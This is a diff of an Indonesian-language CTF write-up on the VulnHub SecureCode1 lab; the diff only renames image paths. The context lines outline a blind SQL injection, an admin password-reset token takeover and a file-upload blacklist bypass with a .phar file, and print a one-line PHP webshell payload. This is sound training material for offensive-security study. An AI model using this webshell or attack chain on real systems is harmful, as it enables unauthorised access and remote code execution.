@@ -13,14 +13,14 @@ Install qemu
 $ brew install qemu
 $ qemu-system-x86_64 --version
 ```
-![qemu version](/img/vulnhub-securecode1/qemu-version.png)
+![qemu version](/img/Vulnhub-Securecode1/qemu-version.png)
 
 ## convert OVA to QCOW2
 Lakukan ekstrak file
 ```
 $ tar -xvf SecureCode1.ova
 ```
-![ekstrak ova](/img/vulnhub-securecode1/extract-ova.png)
+![ekstrak ova](/img/Vulnhub-Securecode1/extract-ova.png)
 
 Lalu convert file vmdk ke qcow2
 ```
@@ -29,7 +29,7 @@ $ qemu-img convert -O qcow2 SecureCode1-disk1.vmdk SecureCode1-disk1.qcow2
 
 ## virtualization using UTM
 Download dari https://getutm.app/ atau dari https://github.com/utmapp/UTM/releases kemudian pilih 'emulate'
-![emulate UTM](/img/vulnhub-securecode1/utm-start.png)
+![emulate UTM](/img/Vulnhub-Securecode1/utm-start.png)
 Lalu bagian 
 ```
 'Operating System' pilih 'Other' 
@@ -65,7 +65,7 @@ Setelah dilakukan pengecekan path routing tidak ada mapping dari routing, pengec
 include "../include/isAuthenticated.php";
 ``` 
 Kemudian melakukan mapping unathenticated endpoint didapatkan
-![mapping endpoint auth](/img/vulnhub-securecode1/mapping-auth-endpoint.png)
+![mapping endpoint auth](/img/Vulnhub-Securecode1/mapping-auth-endpoint.png)
 
 Endpoint /login tidak ada pengecekan isAuthenticated, kemudian melakukan pengecekan pada /login/resetPassword.php fungsi generateToken dan user input didapatan ada sanitasi.
 ```
@@ -84,16 +84,16 @@ function generateToken(){
 }
 ```
 Selanjutnya pada /item/viewItem.php tidak ada pengecekan isAuthenticated.php yang berati unauthenticated endpoint dan juga vulnerable sql injection
-![unauth sqli](/img/vulnhub-securecode1/blind-sqli.png)
+![unauth sqli](/img/Vulnhub-Securecode1/blind-sqli.png)
 
 Berdasarkan code, kondisi true didapatkan 404 
-![true blind](/img/vulnhub-securecode1/sqli-true.png)
+![true blind](/img/Vulnhub-Securecode1/sqli-true.png)
 
 Kondisi false didapatkan 302
-![false blind](/img/vulnhub-securecode1/sqli-false.png)
+![false blind](/img/Vulnhub-Securecode1/sqli-false.png)
 
 Pada db.sql didapatkan tabel user dan juga column token, skenarionya adalah melakukan reset password admin lalu ambil tokennya untuk change password.
-![table sql](/img/vulnhub-securecode1/table-sql.png)
+![table sql](/img/Vulnhub-Securecode1/table-sql.png)
 
 Script untuk fetch token
 ```
@@ -144,10 +144,10 @@ Pada source code untuk change password akses
 ```
 http://192.168.64.2/login/doResetPassword.php?token=
 ```
-![success token](/img/vulnhub-securecode1/success-token.png)
+![success token](/img/Vulnhub-Securecode1/success-token.png)
 
 Login didapatkan berhasil, ambil flag
-![flag1](/img/vulnhub-securecode1/flag1.png)
+![flag1](/img/Vulnhub-Securecode1/flag1.png)
 
 # Bypass file upload extensions leads to remote code execution
 
@@ -157,24 +157,24 @@ Pada edit item menggunakan updateItem.php
 ```
 http://192.168.64.2/item/editItem.php?id=1
 ```
-![edit item](/img/vulnhub-securecode1/edititem-web.png)
+![edit item](/img/Vulnhub-Securecode1/edititem-web.png)
 
 Kemudian pada source didapatkan ada blacklist extension, berdasarkan dari blacklist kemungkinan yang lolos adalah 
 ```
 php7,pht,phps,inc,phar, dan pgif
 ``` 
-![controller edit item](/img/vulnhub-securecode1/sourcecode-fileupload.png)
+![controller edit item](/img/Vulnhub-Securecode1/sourcecode-fileupload.png)
 
 Setelah dicoba semua extension, phar didapatkan berhasil.
 payload phar
 ```
 <?php echo "Shell";system($_GET['cmd']); ?>
 ```
-![phar webshell](/img/vulnhub-securecode1/phar-webshell.png)
+![phar webshell](/img/Vulnhub-Securecode1/phar-webshell.png)
 
 # OSWE STYLE
 Penulis mengadaptasi pada OSWE dimana hanya satu script dijalankan akan eksploitasi satu mesin.
-![oswe rules](/img/vulnhub-securecode1/oswe-rules.png) 
+![oswe rules](/img/Vulnhub-Securecode1/oswe-rules.png) 
 
 Secara flow source code didapatkan sebagai berikut:
 ```
@@ -182,6 +182,6 @@ Secara flow source code didapatkan sebagai berikut:
 2. fetch token to bypass authentication using blind sql injection
 3. upload phar to get webshell and reverse shell
 ```
-![fetch all flag](/img/vulnhub-securecode1/all-flags.png) 
+![fetch all flag](/img/Vulnhub-Securecode1/all-flags.png) 
 
 Untuk script akses [disini](https://github.com/ahm4ddm/oswe-preparation/blob/main/exp-securecode1.py)
